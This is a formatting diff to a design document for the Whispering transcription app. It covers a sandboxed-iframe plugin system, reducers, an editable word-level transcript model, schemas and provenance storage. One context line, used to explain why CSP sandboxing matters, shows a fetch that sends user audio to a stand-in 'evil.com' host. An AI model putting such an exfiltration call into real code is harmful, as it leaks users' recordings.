@@ -348,10 +348,7 @@ await fetch('https://evil.com/steal', { body: userAudioData });
 **Sandboxed iframes ARE secure:**
 
 ```html
-<iframe
-	sandbox="allow-scripts"
-	csp="connect-src api.groq.com; default-src 'none';"
-></iframe>
+<iframe sandbox="allow-scripts" csp="connect-src api.groq.com; default-src 'none';"></iframe>
 ```
 
 Browser enforces CSP at the network layer - cannot be bypassed by JavaScript.
@@ -420,7 +417,7 @@ function loadPlugin(manifest: PluginManifest): PluginHandle {
 		terminate: () => {
 			if (timeoutId) clearTimeout(timeoutId);
 			iframe.remove();
-		},
+		}
 	};
 }
 ```
@@ -467,18 +464,15 @@ definePlugin({
 
 		// fetch() works because manifest declares: network: ['api.groq.com']
 		// CSP blocks any other domain - no bridge needed!
-		const response = await fetch(
-			'https://api.groq.com/openai/v1/audio/transcriptions',
-			{
-				method: 'POST',
-				headers: { Authorization: `Bearer ${options.apiKey}` },
-				body: formData,
-			},
-		);
+		const response = await fetch('https://api.groq.com/openai/v1/audio/transcriptions', {
+			method: 'POST',
+			headers: { Authorization: `Bearer ${options.apiKey}` },
+			body: formData
+		});
 
 		const data = await response.json();
 		return data.text;
-	},
+	}
 });
 ```
 
@@ -556,7 +550,7 @@ window.addEventListener('load', () => {
 				() => {
 					pluginManager.getPlugin(manifest.id);
 				},
-				{ timeout: 5000 + i * 1000 },
+				{ timeout: 5000 + i * 1000 }
 			);
 		});
 	}, 2000);
@@ -622,9 +616,7 @@ Plugin Author                    Plugin Registry               User
 	import { page } from '$app/stores';
 	import { pluginRegistry } from '$lib/plugins';
 
-	let PluginComponent = $derived(
-		pluginRegistry.getRouteComponent($page.params.path),
-	);
+	let PluginComponent = $derived(pluginRegistry.getRouteComponent($page.params.path));
 </script>
 
 {#if PluginComponent}
@@ -708,7 +700,7 @@ export const services = {
 	clipboard,
 	sound,
 	download,
-	analytics,
+	analytics
 };
 
 // 4. Settings
@@ -889,7 +881,7 @@ export default defineConfig({
 			tier: 1,
 			capabilities: ['network:api.groq.com', 'audio:read'],
 			whisperingVersion: '>=2.0.0',
-			author: { name: 'Epicenter Team', verified: true },
+			author: { name: 'Epicenter Team', verified: true }
 		},
 
 		excludeDeps: ['svelte', '@epicenter/core'],
@@ -899,12 +891,12 @@ export default defineConfig({
 				name: 'transcription-groq',
 				type: 'service',
 				files: [{ path: 'src/index.ts' }],
-				envVars: { GROQ_API_KEY: '' },
-			},
+				envVars: { GROQ_API_KEY: '' }
+			}
 		],
 
-		outputs: [repository()],
-	},
+		outputs: [repository()]
+	}
 });
 ```
 
@@ -1116,17 +1108,14 @@ type WhisperingEvent =
 	| { type: 'recording.deleted'; recordingId: string };
 
 // Pure reducer
-function reduce(
-	state: WhisperingState,
-	event: WhisperingEvent,
-): WhisperingState {
+function reduce(state: WhisperingState, event: WhisperingEvent): WhisperingState {
 	switch (event.type) {
 		case 'transcription.completed':
 			return {
 				...state,
 				recordings: state.recordings.map((r) =>
-					r.id === event.recordingId ? { ...r, transcript: event.text } : r,
-				),
+					r.id === event.recordingId ? { ...r, transcript: event.text } : r
+				)
 			};
 		// ... etc
 	}
@@ -1432,20 +1421,20 @@ The Coordinator actor uses a pure reducer internally (FC/IS pattern):
 // Pure reducer inside Coordinator actor
 function coordinatorReducer(
 	state: WhisperingState,
-	msg: WhisperingActorMessage,
+	msg: WhisperingActorMessage
 ): [WhisperingState, WhisperingActorMessage[]] {
 	switch (msg.type) {
 		case 'START_RECORDING':
 			return [
 				{ ...state, status: 'recording' },
-				[], // No outgoing messages yet
+				[] // No outgoing messages yet
 			];
 
 		case 'TRANSCRIPT_READY':
 			const newState = {
 				...state,
 				status: 'transforming',
-				currentTranscript: msg.text,
+				currentTranscript: msg.text
 			};
 			// Decide what to do next based on settings
 			const outgoing: WhisperingActorMessage[] = state.settings.autoTransform
@@ -1453,8 +1442,8 @@ function coordinatorReducer(
 						{
 							type: 'TRANSFORM_TEXT',
 							text: msg.text,
-							transformation: state.settings.defaultTransformation,
-						},
+							transformation: state.settings.defaultTransformation
+						}
 					]
 				: [{ type: 'COPY_TO_CLIPBOARD', text: msg.text }];
 
@@ -1463,7 +1452,7 @@ function coordinatorReducer(
 		case 'TRANSFORMED':
 			return [
 				{ ...state, status: 'idle', lastResult: msg.result },
-				[{ type: 'COPY_TO_CLIPBOARD', text: msg.result }],
+				[{ type: 'COPY_TO_CLIPBOARD', text: msg.result }]
 			];
 
 		default:
@@ -1950,7 +1939,7 @@ const document: EditableDocument = {
 			length: 0.3,
 			text: 'Hello',
 			conf: 0.98,
-			uuid: 'w1',
+			uuid: 'w1'
 		},
 		{
 			type: 'text',
@@ -1959,14 +1948,14 @@ const document: EditableDocument = {
 			length: 0.2,
 			text: 'my',
 			conf: 0.95,
-			uuid: 'w2',
+			uuid: 'w2'
 		},
 		{
 			type: 'non_text',
 			source: 'abc123',
 			sourceStart: 0.5,
 			length: 0.2,
-			uuid: 'n1',
+			uuid: 'n1'
 		}, // breathing
 		{
 			type: 'text',
@@ -1975,7 +1964,7 @@ const document: EditableDocument = {
 			length: 0.3,
 			text: 'name',
 			conf: 0.97,
-			uuid: 'w3',
+			uuid: 'w3'
 		},
 		{
 			type: 'text',
@@ -1984,7 +1973,7 @@ const document: EditableDocument = {
 			length: 0.2,
 			text: 'is',
 			conf: 0.99,
-			uuid: 'w4',
+			uuid: 'w4'
 		},
 		{
 			type: 'text',
@@ -1993,17 +1982,17 @@ const document: EditableDocument = {
 			length: 0.4,
 			text: 'Alice',
 			conf: 0.96,
-			uuid: 'w5',
+			uuid: 'w5'
 		},
-		{ type: 'paragraph_end', uuid: 'p1e' },
+		{ type: 'paragraph_end', uuid: 'p1e' }
 	],
 	sources: {
-		abc123: { blob: Blob, objectUrl: 'blob:...' },
+		abc123: { blob: Blob, objectUrl: 'blob:...' }
 	},
 	metadata: {
 		displaySpeakerNames: true,
-		displayVideo: false,
-	},
+		displayVideo: false
+	}
 };
 ```
 
@@ -2084,7 +2073,7 @@ function computeRenderItems(content: DocumentItem[]): RenderItem[] {
 					sourceStart: item.sourceStart,
 					length: item.length,
 					absoluteStart: currentTime,
-					speaker: currentSpeaker,
+					speaker: currentSpeaker
 				};
 			}
 			currentTime += item.length;
@@ -2096,7 +2085,7 @@ function computeRenderItems(content: DocumentItem[]): RenderItem[] {
 			items.push({
 				type: 'silence',
 				length: item.length,
-				absoluteStart: currentTime,
+				absoluteStart: currentTime
 			});
 			currentTime += item.length;
 		}
@@ -2286,7 +2275,7 @@ async function exportAudio(
 	renderItems: RenderItem[],
 	sources: Record<string, Source>,
 	outputPath: string,
-	onProgress: (p: number) => void,
+	onProgress: (p: number) => void
 ): Promise<void> {
 	const tempDir = await createTempDir();
 
@@ -2300,14 +2289,14 @@ async function exportAudio(
 				path: sourcePath,
 				options: {
 					ss: item.sourceStart.toString(), // Start time
-					t: item.length.toString(), // Duration
-				},
+					t: item.length.toString() // Duration
+				}
 			};
 		} else {
 			// Generate silence with FFmpeg filter
 			return {
 				filter: 'anullsrc',
-				options: { duration: item.length },
+				options: { duration: item.length }
 			};
 		}
 	});
@@ -2342,12 +2331,9 @@ type TranscriptSegment = {
 };
 
 // Conversion to document items
-function transcriptToDocument(
-	transcript: TranscriptFinal,
-	speaker: string,
-): DocumentItem[] {
+function transcriptToDocument(transcript: TranscriptFinal, speaker: string): DocumentItem[] {
 	const items: DocumentItem[] = [
-		{ type: 'paragraph_start', speaker, language: null, uuid: nanoid() },
+		{ type: 'paragraph_start', speaker, language: null, uuid: nanoid() }
 	];
 
 	for (const segment of transcript.segments) {
@@ -2359,7 +2345,7 @@ function transcriptToDocument(
 				sourceStart: segment.start,
 				length: segment.end - segment.start,
 				text: segment.word,
-				conf: segment.confidence,
+				conf: segment.confidence
 			});
 		} else if (segment.type === 'non_speech') {
 			items.push({
@@ -2367,7 +2353,7 @@ function transcriptToDocument(
 				uuid: nanoid(),
 				source: transcript.sourceId,
 				sourceStart: segment.start,
-				length: segment.end - segment.start,
+				length: segment.end - segment.start
 			});
 		}
 	}
@@ -2728,7 +2714,7 @@ function computeRenderItems(content: DocumentItem[]): RenderItem[] {
 				source: item.source,
 				sourceStart: item.sourceStart,
 				length: item.length,
-				absoluteStart: currentTime,
+				absoluteStart: currentTime
 			});
 			currentTime += item.length;
 		} else if (item.type === 'generated_text') {
@@ -2739,7 +2725,7 @@ function computeRenderItems(content: DocumentItem[]): RenderItem[] {
 					source: item.generatedSource,
 					sourceStart: 0, // Generated audio starts at 0
 					length: item.length!,
-					absoluteStart: currentTime,
+					absoluteStart: currentTime
 				});
 				currentTime += item.length!;
 			} else {
@@ -2748,7 +2734,7 @@ function computeRenderItems(content: DocumentItem[]): RenderItem[] {
 				items.push({
 					type: 'silence',
 					length: estimatedLength,
-					absoluteStart: currentTime,
+					absoluteStart: currentTime
 				});
 				currentTime += estimatedLength;
 			}
@@ -2785,7 +2771,7 @@ interface ModifiedItem {
 function detectEdits(
 	before: DocumentItem[],
 	after: DocumentItem[],
-	editRange: { start: number; end: number },
+	editRange: { start: number; end: number }
 ): EditDetectionResult {
 	// Compare documents to determine what changed
 
@@ -2803,8 +2789,8 @@ function detectEdits(
 				uuid: m.uuid,
 				originalText: m.before,
 				newText: m.after,
-				needsGeneration: true,
-			})),
+				needsGeneration: true
+			}))
 		};
 	}
 
@@ -2814,7 +2800,7 @@ function detectEdits(
 		return {
 			type: 'insertion',
 			text: inserted.text,
-			position: inserted.position,
+			position: inserted.position
 		};
 	}
 
@@ -2826,7 +2812,7 @@ function insertGeneratedText(
 	document: EditableDocument,
 	text: string,
 	position: number,
-	speaker: string,
+	speaker: string
 ): EditableDocument {
 	const words = text.split(/\s+/).filter((w) => w.length > 0);
 	const voiceId = document.speakers?.[speaker]?.voiceCloneId;
@@ -2836,7 +2822,7 @@ function insertGeneratedText(
 		uuid: nanoid(),
 		text: word,
 		voice: voiceId || 'default',
-		status: 'pending',
+		status: 'pending'
 	}));
 
 	return {
@@ -2844,8 +2830,8 @@ function insertGeneratedText(
 		content: [
 			...document.content.slice(0, position),
 			...newItems,
-			...document.content.slice(position),
-		],
+			...document.content.slice(position)
+		]
 	};
 }
 ```
@@ -3075,12 +3061,12 @@ export const WHISPERING_TEMPLATE = {
 				transcribedText: text({ name: 'Transcribed Text' }), // Still plain text!
 				transcriptionStatus: select({
 					name: 'Status',
-					options: ['UNPROCESSED', 'TRANSCRIBING', 'DONE', 'FAILED'],
-				}),
-			},
-		}),
+					options: ['UNPROCESSED', 'TRANSCRIBING', 'DONE', 'FAILED']
+				})
+			}
+		})
 	},
-	kv: {},
+	kv: {}
 } as const;
 ```
 
@@ -3100,12 +3086,12 @@ const ParagraphStartSchema = Type.Object({
 	type: Type.Literal('paragraph_start'),
 	uuid: Type.String(),
 	speaker: Type.String(),
-	language: Type.Union([Type.String(), Type.Null()]),
+	language: Type.Union([Type.String(), Type.Null()])
 });
 
 const ParagraphEndSchema = Type.Object({
 	type: Type.Literal('paragraph_end'),
-	uuid: Type.String(),
+	uuid: Type.String()
 });
 
 const TextItemSchema = Type.Object({
@@ -3115,7 +3101,7 @@ const TextItemSchema = Type.Object({
 	sourceStart: Type.Number(), // Start time in source (seconds)
 	length: Type.Number(), // Duration (seconds)
 	text: Type.String(), // Transcribed word
-	conf: Type.Number(), // Confidence (0-1)
+	conf: Type.Number() // Confidence (0-1)
 });
 
 const NonTextItemSchema = Type.Object({
@@ -3123,13 +3109,13 @@ const NonTextItemSchema = Type.Object({
 	uuid: Type.String(),
 	source: Type.String(),
 	sourceStart: Type.Number(),
-	length: Type.Number(),
+	length: Type.Number()
 });
 
 const ArtificialSilenceSchema = Type.Object({
 	type: Type.Literal('artificial_silence'),
 	uuid: Type.String(),
-	length: Type.Number(),
+	length: Type.Number()
 });
 
 const GeneratedTextSchema = Type.Object({
@@ -3144,8 +3130,8 @@ const GeneratedTextSchema = Type.Object({
 		Type.Literal('pending'),
 		Type.Literal('generating'),
 		Type.Literal('generated'),
-		Type.Literal('failed'),
-	]),
+		Type.Literal('failed')
+	])
 });
 
 const DocumentItemSchema = Type.Union([
@@ -3154,7 +3140,7 @@ const DocumentItemSchema = Type.Union([
 	TextItemSchema,
 	NonTextItemSchema,
 	ArtificialSilenceSchema,
-	GeneratedTextSchema,
+	GeneratedTextSchema
 ]);
 
 const SpeakerDataSchema = Type.Object({
@@ -3162,7 +3148,7 @@ const SpeakerDataSchema = Type.Object({
 	language: Type.Optional(Type.String()),
 	voiceCloneId: Type.Optional(Type.String()),
 	voiceCloneProvider: Type.Optional(Type.String()),
-	voiceCloneCreatedAt: Type.Optional(Type.Number()),
+	voiceCloneCreatedAt: Type.Optional(Type.Number())
 });
 
 // ═══════════════════════════════════════════════════════════════════
@@ -3191,7 +3177,7 @@ export const WHISPERING_TEMPLATE = {
 				transcribedText: text({ name: 'Transcribed Text' }),
 				transcriptionStatus: select({
 					name: 'Status',
-					options: ['UNPROCESSED', 'TRANSCRIBING', 'DONE', 'FAILED'],
+					options: ['UNPROCESSED', 'TRANSCRIBING', 'DONE', 'FAILED']
 				}),
 
 				// ─────────────────────────────────────────────────────────
@@ -3201,7 +3187,7 @@ export const WHISPERING_TEMPLATE = {
 					name: 'Segments',
 					description: 'Word-level transcript with source references',
 					schema: Type.Array(DocumentItemSchema),
-					nullable: true, // null = legacy recording without segments
+					nullable: true // null = legacy recording without segments
 				}),
 
 				// ─────────────────────────────────────────────────────────
@@ -3211,7 +3197,7 @@ export const WHISPERING_TEMPLATE = {
 					name: 'Speakers',
 					description: 'Speaker metadata and voice clone references',
 					schema: Type.Record(Type.String(), SpeakerDataSchema),
-					nullable: true,
+					nullable: true
 				}),
 
 				// ─────────────────────────────────────────────────────────
@@ -3220,12 +3206,12 @@ export const WHISPERING_TEMPLATE = {
 				isProject: boolean({
 					name: 'Is Project',
 					description: 'True if recording has been opened for editing',
-					default: false,
-				}),
-			},
-		}),
+					default: false
+				})
+			}
+		})
 	},
-	kv: {},
+	kv: {}
 } as const;
 ```
 
@@ -3358,17 +3344,10 @@ interface AudioStorage {
 	getAudioUrl(recordingId: string): Promise<string>;
 
 	// NEW: Save generated audio clip
-	saveGeneratedAudio(
-		recordingId: string,
-		generatedId: string,
-		audio: Blob,
-	): Promise<void>;
+	saveGeneratedAudio(recordingId: string, generatedId: string, audio: Blob): Promise<void>;
 
 	// NEW: Get generated audio
-	getGeneratedAudioBlob(
-		recordingId: string,
-		generatedId: string,
-	): Promise<Blob | null>;
+	getGeneratedAudioBlob(recordingId: string, generatedId: string): Promise<Blob | null>;
 }
 ```
 
@@ -3397,21 +3376,21 @@ async function migrateToProject(recordingId: string): Promise<void> {
 
 	// 2. Re-transcribe with word-level timestamps
 	const transcriptionResult = await transcriptionService.transcribe(audioBlob, {
-		returnWordTimestamps: true, // NEW option
+		returnWordTimestamps: true // NEW option
 	});
 
 	// 3. Convert to document items
 	const segments = transcriptToDocumentItems(
 		transcriptionResult.segments,
 		recordingId, // source reference
-		'Speaker', // default speaker name
+		'Speaker' // default speaker name
 	);
 
 	// 4. Update recording
 	workspace.tables.recordings.update({
 		id: recordingId,
 		segments,
-		isProject: true,
+		isProject: true
 		// Keep transcribedText for backwards compat
 	});
 }
@@ -3420,15 +3399,15 @@ async function migrateToProject(recordingId: string): Promise<void> {
 function transcriptToDocumentItems(
 	segments: TranscriptSegment[],
 	sourceId: string,
-	defaultSpeaker: string,
+	defaultSpeaker: string
 ): DocumentItem[] {
 	const items: DocumentItem[] = [
 		{
 			type: 'paragraph_start',
 			uuid: nanoid(),
 			speaker: defaultSpeaker,
-			language: null,
-		},
+			language: null
+		}
 	];
 
 	for (const segment of segments) {
@@ -3440,7 +3419,7 @@ function transcriptToDocumentItems(
 				sourceStart: segment.start,
 				length: segment.end - segment.start,
 				text: segment.word,
-				conf: segment.confidence,
+				conf: segment.confidence
 			});
 		} else if (segment.type === 'non_speech') {
 			items.push({
@@ -3448,7 +3427,7 @@ function transcriptToDocumentItems(
 				uuid: nanoid(),
 				source: sourceId,
 				sourceStart: segment.start,
-				length: segment.end - segment.start,
+				length: segment.end - segment.start
 			});
 		}
 	}
@@ -3521,7 +3500,7 @@ Currently, all transcription services extract **only `.text.trim()`**, discardin
    // Line 64-74 in elevenlabs.ts
    const transcription = await client.speechToText.convert({
    	file: audioBlob,
-   	diarize: true, // REQUESTED!
+   	diarize: true // REQUESTED!
    });
    return Ok(transcription.text.trim()); // speaker_id DROPPED!
    ```
@@ -3535,10 +3514,10 @@ Currently, all transcription services extract **only `.text.trim()`**, discardin
    		channels: type({
    			alternatives: type({
    				transcript: 'string',
-   				'confidence?': 'number', // EXISTS but NEVER USED!
-   			}).array(),
-   		}).array(),
-   	},
+   				'confidence?': 'number' // EXISTS but NEVER USED!
+   			}).array()
+   		}).array()
+   	}
    });
    ```
 
@@ -3586,13 +3565,7 @@ type TranscriptionResult = {
 	// PROVENANCE (lightweight, always stored)
 	// ═══════════════════════════════════════════════════════════════════
 	provenance: {
-		provider:
-			| 'openai'
-			| 'deepgram'
-			| 'elevenlabs'
-			| 'groq'
-			| 'mistral'
-			| 'local';
+		provider: 'openai' | 'deepgram' | 'elevenlabs' | 'groq' | 'mistral' | 'local';
 		model: string;
 		timestamp: string; // When transcribed (ISO 8601)
 		apiVersion?: string; // For debugging API changes
@@ -3682,7 +3655,7 @@ const WHISPERING_TEMPLATE = {
 				// Normalized segments (always stored when available)
 				segments: json({
 					schema: Type.Array(TranscriptSegmentSchema),
-					nullable: true,
+					nullable: true
 				}),
 
 				// Provenance (lightweight, always stored)
@@ -3691,40 +3664,39 @@ const WHISPERING_TEMPLATE = {
 						provider: Type.String(),
 						model: Type.String(),
 						timestamp: Type.String(),
-						apiVersion: Type.Optional(Type.String()),
+						apiVersion: Type.Optional(Type.String())
 					}),
-					nullable: true,
+					nullable: true
 				}),
 
 				// Raw response (optional, based on setting)
 				transcriptionRawResponse: json({
 					schema: Type.Unknown(), // Any JSON
-					nullable: true,
+					nullable: true
 				}),
 
 				// Detected language
 				detectedLanguage: json({
 					schema: Type.Object({
 						code: Type.String(),
-						confidence: Type.Optional(Type.Number()),
+						confidence: Type.Optional(Type.Number())
 					}),
-					nullable: true,
+					nullable: true
 				}),
 
 				// Audio duration
-				audioDuration: real({ nullable: true }),
-			},
-		}),
+				audioDuration: real({ nullable: true })
+			}
+		})
 	},
 	kv: {
 		// User setting to control raw storage
 		storeRawTranscriptionResponses: setting({
 			name: 'Store Raw Responses',
-			description:
-				'Keep original API responses for debugging. Uses more storage.',
-			field: boolean({ default: false }),
-		}),
-	},
+			description: 'Keep original API responses for debugging. Uses more storage.',
+			field: boolean({ default: false })
+		})
+	}
 };
 ```
 
